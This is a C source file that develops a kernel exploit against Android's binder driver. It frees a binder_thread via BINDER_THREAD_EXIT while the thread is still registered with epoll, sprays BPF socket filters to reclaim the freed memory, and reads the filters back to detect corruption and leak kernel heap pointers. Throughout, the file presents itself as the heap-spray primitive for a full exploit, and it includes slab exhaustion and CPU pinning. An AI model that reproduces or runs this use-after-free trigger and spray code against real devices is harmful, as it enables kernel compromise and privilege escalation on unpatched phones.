/*
 * bpf_reclaim_detect.c — Detect BPF→binder_thread cross-cache reclaim
 *
 * KEY INSIGHT: The previous test (bpf_spray_test.c) used crash detection
 * (SIGSEGV on EPOLL_CTL_DEL). But list_del writes into the reclaimed memory
 * WITHOUT crashing — it overwrites the list_head with self-pointers.
 *
 * This test uses SO_GET_FILTER to READ BACK the BPF filter data after
 * EPOLL_CTL_DEL. If reclaim happened, list_del corrupts specific instructions
 * with kernel heap addresses, which we can detect.
 *
 * The wait_queue_head_t in binder_thread at offset 0x48:
 *   +0x48: spinlock (4 bytes) + padding (4 bytes)
 *   +0x50: list_head.next (8 bytes)
 *   +0x58: list_head.prev (8 bytes)
 *
 * After EPOLL_CTL_DEL's list_del with reclaimed BPF data:
 *   - list_head.next and .prev get overwritten with the address of the
 *     list_head itself (kernel heap pointer, 0xffffffc0XXXXXXXX)
 *   - We detect this by reading back the BPF filter instructions
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o bpf_reclaim_detect bpf_reclaim_detect.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <stdint.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)
#define BINDER_VERSION      _IOWR('b', 9, struct { signed long protocol_version; })

/* SO_GET_FILTER is sometimes not defined in musl headers */
#ifndef SO_GET_FILTER
#define SO_GET_FILTER SO_ATTACH_FILTER
#endif

/* Marker value to detect corruption */
#define MARKER_K    0x41414141
#define MARKER_CODE (BPF_LD | BPF_IMM)  /* 0x0000 */

/*
 * Create BPF filter with distinctive marker values.
 * All instructions: code=BPF_LD|BPF_IMM (0x0000), jt=0, jf=0, k=MARKER_K
 * Last instruction: BPF_RET|BPF_K, k=MARKER_K
 *
 * The spinlock at binder_thread+0x48 needs to read as 0 for spin_lock to
 * succeed. code=0x0000, jt=0, jf=0 gives us 4 zero bytes at the start
 * of each instruction — this covers the spinlock regardless of alignment.
 */
static struct sock_filter *make_marker_filter(int n_insns) {
    struct sock_filter *filter = calloc(n_insns, sizeof(struct sock_filter));
    if (!filter) return NULL;

    for (int i = 0; i < n_insns - 1; i++) {
        filter[i].code = MARKER_CODE;
        filter[i].jt = 0;
        filter[i].jf = 0;
        filter[i].k = MARKER_K;
    }
    /* Must end with RET for kernel to accept */
    filter[n_insns - 1].code = BPF_RET | BPF_K;
    filter[n_insns - 1].jt = 0;
    filter[n_insns - 1].jf = 0;
    filter[n_insns - 1].k = MARKER_K;

    return filter;
}

/*
 * Read back BPF filter from socket via SO_GET_FILTER (getsockopt).
 * Returns number of instructions read, or -1 on error.
 */
static int readback_filter(int sock, struct sock_filter *buf, int max_insns) {
    socklen_t len = max_insns;
    int ret = getsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, buf, &len);
    if (ret < 0) return -1;
    return (int)len;
}

/*
 * Check if any instruction in the filter was corrupted (differs from marker).
 * Returns the index of the first corrupted instruction, or -1 if clean.
 */
static int check_corruption(struct sock_filter *buf, int n_insns, int orig_n_insns) {
    for (int i = 0; i < n_insns && i < orig_n_insns; i++) {
        int is_last = (i == orig_n_insns - 1);
        uint16_t expected_code = is_last ? (BPF_RET | BPF_K) : MARKER_CODE;

        if (buf[i].code != expected_code ||
            buf[i].jt != 0 ||
            buf[i].jf != 0 ||
            buf[i].k != MARKER_K) {
            return i;
        }
    }
    return -1;
}

/*
 * Print corrupted instructions with analysis
 */
static void dump_corruption(struct sock_filter *buf, int n_insns, int orig_n_insns) {
    printf("  Instruction dump (corrupted marked with ***):\n");
    for (int i = 0; i < n_insns && i < orig_n_insns; i++) {
        int is_last = (i == orig_n_insns - 1);
        uint16_t expected_code = is_last ? (BPF_RET | BPF_K) : MARKER_CODE;

        int corrupted = (buf[i].code != expected_code ||
                        buf[i].jt != 0 ||
                        buf[i].jf != 0 ||
                        buf[i].k != MARKER_K);

        if (corrupted) {
            /* Reconstruct the 8 raw bytes */
            uint64_t raw = 0;
            memcpy(&raw, &buf[i], 8);
            printf("  *** insn[%2d]: code=0x%04x jt=0x%02x jf=0x%02x k=0x%08x"
                   "  raw=0x%016llx\n",
                   i, buf[i].code, buf[i].jt, buf[i].jf, buf[i].k,
                   (unsigned long long)raw);

            /* Check if this looks like a kernel pointer */
            if ((raw & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL ||
                (raw & 0xFFFFFF0000000000ULL) == 0xffffff8000000000ULL) {
                printf("         ^^^ KERNEL POINTER: 0x%016llx\n",
                       (unsigned long long)raw);
                /* Calculate allocation offset */
                int byte_offset_32 = 32 + i * 8; /* assuming 32-byte header */
                int byte_offset_40 = 40 + i * 8; /* assuming 40-byte header */
                printf("         Allocation offset: 0x%x (hdr=32) or 0x%x (hdr=40)\n",
                       byte_offset_32, byte_offset_40);
            }
        }
    }
}

/*
 * Pin to a specific CPU for SLUB per-cpu cache locality
 */
static int pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

/*
 * Test: BPF reclaim detection with SO_GET_FILTER readback
 *
 * Strategy:
 * 1. (Optional) Pre-spray to exhaust active slab
 * 2. Open binder, add to epoll, free thread
 * 3. Spray BPF with marker pattern
 * 4. EPOLL_CTL_DEL (triggers list_del on reclaimed memory)
 * 5. Read back ALL BPF filters, look for corruption
 */
static void test_reclaim_readback(int n_insns, int n_spray, int n_exhaust, int cpu) {
    int total_size = 40 + 8 * n_insns; /* conservative estimate */
    int cache = total_size <= 192 ? 192 : total_size <= 256 ? 256 :
                total_size <= 512 ? 512 : 1024;

    printf("\n--- Readback test: %d insns (%d bytes, kmalloc-%d), spray=%d, exhaust=%d, cpu=%d ---\n",
           n_insns, total_size, cache, n_spray, n_exhaust, cpu);

    pid_t pid = fork();
    if (pid < 0) { printf("  fork failed\n"); return; }

    if (pid == 0) {
        /* Pin to CPU for SLUB locality */
        if (cpu >= 0) {
            if (pin_cpu(cpu) < 0)
                printf("  CPU pin failed (errno=%d), continuing anyway\n", errno);
        }

        /* Step 0: Pre-exhaust slab to force freed object into active slab */
        int *exhaust_socks = NULL;
        if (n_exhaust > 0) {
            exhaust_socks = calloc(n_exhaust, sizeof(int));
            struct sock_filter *ef = make_marker_filter(n_insns);
            struct sock_fprog eprog = { .len = n_insns, .filter = ef };
            int exhausted = 0;
            for (int i = 0; i < n_exhaust; i++) {
                exhaust_socks[i] = socket(AF_UNIX, SOCK_DGRAM, 0);
                if (exhaust_socks[i] < 0) break;
                if (setsockopt(exhaust_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &eprog, sizeof(eprog)) == 0)
                    exhausted++;
                else {
                    close(exhaust_socks[i]);
                    exhaust_socks[i] = -1;
                    break;
                }
            }
            free(ef);
            printf("  exhausted %d slab objects\n", exhausted);
        }

        /* Step 1: Open binder + force thread creation */
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) { printf("  binder open failed\n"); _exit(1); }
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        struct { signed long protocol_version; } ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        uint64_t kptr = ((uint64_t *)bmap)[0];
        printf("  binder kptr: 0x%016llx\n", (unsigned long long)kptr);

        /* Step 2: Add to epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Step 3: Free binder_thread via BINDER_THREAD_EXIT */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  binder_thread FREED\n");

        /* Step 4: Close exhaust sockets to free their BPF allocations */
        /* This puts MORE free objects in the slab, but the binder_thread's
         * slot should be in the free list too */
        if (exhaust_socks) {
            for (int i = 0; i < n_exhaust; i++)
                if (exhaust_socks[i] >= 0) close(exhaust_socks[i]);
            free(exhaust_socks);
            exhaust_socks = NULL;
            printf("  released exhaust sockets\n");
        }

        /* Step 5: Spray BPF with marker pattern */
        int *socks = calloc(n_spray, sizeof(int));
        struct sock_filter *filt = make_marker_filter(n_insns);
        struct sock_fprog prog = { .len = n_insns, .filter = filt };
        int sprayed = 0;
        for (int i = 0; i < n_spray; i++) {
            socks[i] = socket(AF_UNIX, SOCK_DGRAM, 0);
            if (socks[i] < 0) break;
            if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else {
                close(socks[i]);
                socks[i] = -1;
            }
        }
        free(filt);
        printf("  sprayed %d BPF filters\n", sprayed);

        /* Step 6: Trigger EPOLL_CTL_DEL — list_del on reclaimed memory */
        ev.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL done\n");

        /* Step 7: Read back ALL filters, check for corruption */
        struct sock_filter *readback = calloc(n_insns + 16, sizeof(struct sock_filter));
        int corrupted_count = 0;
        int first_corrupt_sock = -1;

        for (int i = 0; i < n_spray; i++) {
            if (socks[i] < 0) continue;

            memset(readback, 0, (n_insns + 16) * sizeof(struct sock_filter));
            int got = readback_filter(socks[i], readback, n_insns + 16);

            if (got < 0) {
                if (i == 0) printf("  SO_GET_FILTER: errno=%d (%s)\n", errno, strerror(errno));
                continue;
            }

            int ci = check_corruption(readback, got, n_insns);
            if (ci >= 0) {
                corrupted_count++;
                if (first_corrupt_sock < 0) first_corrupt_sock = i;

                printf("\n  >>> CORRUPTION DETECTED in socket[%d]! (insn[%d]) <<<\n", i, ci);
                printf("  >>> THIS PROVES BPF RECLAIMED BINDER_THREAD MEMORY! <<<\n");
                dump_corruption(readback, got, n_insns);
            }
        }

        if (corrupted_count == 0) {
            printf("  no corruption in %d filters — reclaim NOT detected\n", sprayed);
            /* Double check: try reading one filter to confirm readback works */
            if (sprayed > 0 && socks[0] >= 0) {
                memset(readback, 0, (n_insns + 16) * sizeof(struct sock_filter));
                int got = readback_filter(socks[0], readback, n_insns + 16);
                if (got > 0) {
                    printf("  (readback works: got %d insns, insn[0].k=0x%08x)\n",
                           got, readback[0].k);
                } else {
                    printf("  (readback FAILED: ret=%d errno=%d — may need different approach)\n",
                           got, errno);
                }
            }
        } else {
            printf("\n  TOTAL: %d/%d filters corrupted\n", corrupted_count, sprayed);
        }

        free(readback);

        /* Cleanup */
        close(epfd);
        for (int i = 0; i < n_spray; i++)
            if (socks[i] >= 0) close(socks[i]);
        free(socks);
        munmap(bmap, 4096);
        close(bfd);

        _exit(corrupted_count > 0 ? 42 : 0);
    }

    alarm(30);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42)
            printf("  >>> RECLAIM CONFIRMED! BPF can reclaim binder_thread! <<<\n");
        else
            printf("  no reclaim detected (exit=%d)\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  child killed by signal %d — possible reclaim + crash\n", WTERMSIG(status));
    }
}

/*
 * Multi-free variant: free many binder_threads, then spray
 */
static void test_multi_free_readback(int n_fds, int n_insns, int n_spray, int cpu) {
    int total_size = 40 + 8 * n_insns;
    printf("\n--- Multi-free readback: %d frees, %d insns (%d bytes), spray=%d, cpu=%d ---\n",
           n_fds, n_insns, total_size, n_spray, cpu);

    pid_t pid = fork();
    if (pid < 0) { printf("  fork failed\n"); return; }

    if (pid == 0) {
        if (cpu >= 0) pin_cpu(cpu);

        /* Open multiple binder fds */
        int bfds[128], epfds[128];
        void *bmaps[128];
        int actual = 0;

        for (int i = 0; i < n_fds && i < 128; i++) {
            bfds[i] = open("/dev/binder", O_RDWR);
            if (bfds[i] < 0) break;
            bmaps[i] = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfds[i], 0);
            if (bmaps[i] == MAP_FAILED) { close(bfds[i]); break; }

            struct { signed long protocol_version; } ver;
            ioctl(bfds[i], BINDER_VERSION, &ver);

            epfds[i] = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfds[i] };
            epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
            actual++;
        }
        printf("  opened %d binder fds\n", actual);

        /* Free ALL threads */
        for (int i = 0; i < actual; i++)
            ioctl(bfds[i], BINDER_THREAD_EXIT, NULL);
        printf("  freed %d threads\n", actual);

        /* BPF spray with marker */
        int *socks = calloc(n_spray, sizeof(int));
        struct sock_filter *filt = make_marker_filter(n_insns);
        struct sock_fprog prog = { .len = n_insns, .filter = filt };
        int sprayed = 0;
        for (int i = 0; i < n_spray; i++) {
            socks[i] = socket(AF_UNIX, SOCK_DGRAM, 0);
            if (socks[i] < 0) break;
            if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else {
                close(socks[i]);
                socks[i] = -1;
            }
        }
        free(filt);
        printf("  sprayed %d BPF filters\n", sprayed);

        /* Trigger EPOLL_CTL_DEL on ALL epoll fds */
        for (int i = 0; i < actual; i++) {
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, bfds[i], &ev);
        }
        printf("  triggered %d EPOLL_CTL_DEL\n", actual);

        /* Read back ALL BPF filters */
        struct sock_filter *readback = calloc(n_insns + 16, sizeof(struct sock_filter));
        int corrupted_count = 0;

        for (int i = 0; i < n_spray; i++) {
            if (socks[i] < 0) continue;
            memset(readback, 0, (n_insns + 16) * sizeof(struct sock_filter));
            int got = readback_filter(socks[i], readback, n_insns + 16);
            if (got < 0) continue;

            int ci = check_corruption(readback, got, n_insns);
            if (ci >= 0) {
                corrupted_count++;
                printf("  >>> CORRUPTION in socket[%d] at insn[%d]! <<<\n", i, ci);
                dump_corruption(readback, got, n_insns);
            }
        }

        if (corrupted_count == 0)
            printf("  no corruption in %d filters\n", sprayed);
        else
            printf("\n  TOTAL: %d/%d filters corrupted\n", corrupted_count, sprayed);

        free(readback);

        /* Cleanup */
        for (int i = 0; i < n_spray; i++)
            if (socks[i] >= 0) close(socks[i]);
        free(socks);
        for (int i = 0; i < actual; i++) {
            close(epfds[i]);
            munmap(bmaps[i], 4096);
            close(bfds[i]);
        }

        _exit(corrupted_count > 0 ? 42 : 0);
    }

    alarm(60);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        if (WEXITSTATUS(status) == 42)
            printf("  >>> MULTI-FREE RECLAIM CONFIRMED! <<<\n");
        else
            printf("  no reclaim (exit=%d)\n", WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d\n", WTERMSIG(status));
    }
}

int main(void) {
    printf("=== BPF RECLAIM DETECTION (SO_GET_FILTER READBACK) ===\n");
    printf("uid=%u\n", getuid());
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s\n", buf); }
            close(kfd);
        }
    }

    /* Check CPU count for pinning */
    int ncpus = sysconf(_SC_NPROCESSORS_ONLN);
    printf("Online CPUs: %d\n", ncpus);

    /* Phase 0: Verify SO_GET_FILTER readback works */
    printf("\n=== PHASE 0: SO_GET_FILTER readback test ===\n");
    {
        int s = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (s >= 0) {
            struct sock_filter insns[4] = {
                { BPF_LD | BPF_IMM, 0, 0, 0xDEADBEEF },
                { BPF_LD | BPF_IMM, 0, 0, 0xCAFEBABE },
                { BPF_LD | BPF_IMM, 0, 0, 0x12345678 },
                { BPF_RET | BPF_K, 0, 0, 0 }
            };
            struct sock_fprog prog = { .len = 4, .filter = insns };

            int ret = setsockopt(s, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            printf("  attach: ret=%d errno=%d\n", ret, errno);

            if (ret == 0) {
                struct sock_filter readback[8];
                memset(readback, 0, sizeof(readback));
                int got = readback_filter(s, readback, 8);
                printf("  readback: got=%d\n", got);
                if (got > 0) {
                    for (int i = 0; i < got && i < 4; i++)
                        printf("    insn[%d]: code=0x%04x jt=0x%02x jf=0x%02x k=0x%08x\n",
                               i, readback[i].code, readback[i].jt, readback[i].jf, readback[i].k);

                    if (readback[0].k == 0xDEADBEEF && readback[1].k == 0xCAFEBABE)
                        printf("  SO_GET_FILTER: WORKS — readback matches\n");
                    else
                        printf("  SO_GET_FILTER: MISMATCH — readback differs!\n");
                } else {
                    printf("  SO_GET_FILTER: FAILED (errno=%d %s)\n", errno, strerror(errno));
                    printf("  Cannot use readback detection — aborting\n");
                    close(s);
                    return 1;
                }
            }
            close(s);
        }
    }

    /* Phase 1: Single free + BPF spray with readback detection
     * Test multiple sizes targeting different kmalloc caches.
     * binder_thread = 304 bytes → kmalloc-512
     * But let's test kmalloc-256 and kmalloc-512 both */
    printf("\n=== PHASE 1: Single free + readback (no exhaust) ===\n");

    /* kmalloc-256 target: 27 insns = 40+216=256 (or 32+216=248) */
    test_reclaim_readback(27, 512, 0, -1);
    /* kmalloc-512 target: 59 insns = 40+472=512 (or 32+472=504) */
    test_reclaim_readback(59, 512, 0, -1);
    /* Try 33 insns (40+264=304 matching binder_thread size exactly) */
    test_reclaim_readback(33, 512, 0, -1);

    /* Phase 2: Single free + slab exhaust before free */
    printf("\n=== PHASE 2: Single free + slab exhaust + readback ===\n");

    /* Exhaust slab first, then free binder_thread, then spray */
    test_reclaim_readback(33, 512, 256, -1);  /* 256 exhaust objects */
    test_reclaim_readback(59, 512, 256, -1);

    /* Phase 3: CPU-pinned tests */
    printf("\n=== PHASE 3: CPU-pinned single free + readback ===\n");
    for (int cpu = 0; cpu < ncpus && cpu < 6; cpu++) {
        test_reclaim_readback(33, 512, 128, cpu);
    }

    /* Phase 4: Multi-free + readback */
    printf("\n=== PHASE 4: Multi-free + readback ===\n");
    test_multi_free_readback(16, 33, 1024, -1);
    test_multi_free_readback(32, 33, 1024, -1);
    test_multi_free_readback(64, 33, 1024, -1);
    test_multi_free_readback(16, 59, 1024, -1);
    test_multi_free_readback(32, 59, 1024, -1);

    /* Phase 5: Large multi-free + CPU pinning */
    printf("\n=== PHASE 5: Large multi-free + CPU pin ===\n");
    test_multi_free_readback(64, 33, 2048, 0);
    test_multi_free_readback(64, 59, 2048, 0);

    printf("\n=== BPF RECLAIM DETECTION COMPLETE ===\n");
    printf("If any test showed CORRUPTION:\n");
    printf("  → BPF socket filter CAN reclaim binder_thread memory!\n");
    printf("  → The corrupted insn indices reveal the sk_filter header size.\n");
    printf("  → Kernel pointer values reveal heap layout.\n");
    printf("  → This is the spray primitive for the full exploit.\n");
    printf("If no corruption detected:\n");
    printf("  → sock_kmalloc may use a different allocation path on this kernel\n");
    printf("  → Or binder_thread is in a different-sized cache than tested\n");
    printf("  → Consider: pipe buffers, tty_struct, or other spray primitives\n");
    return 0;
}
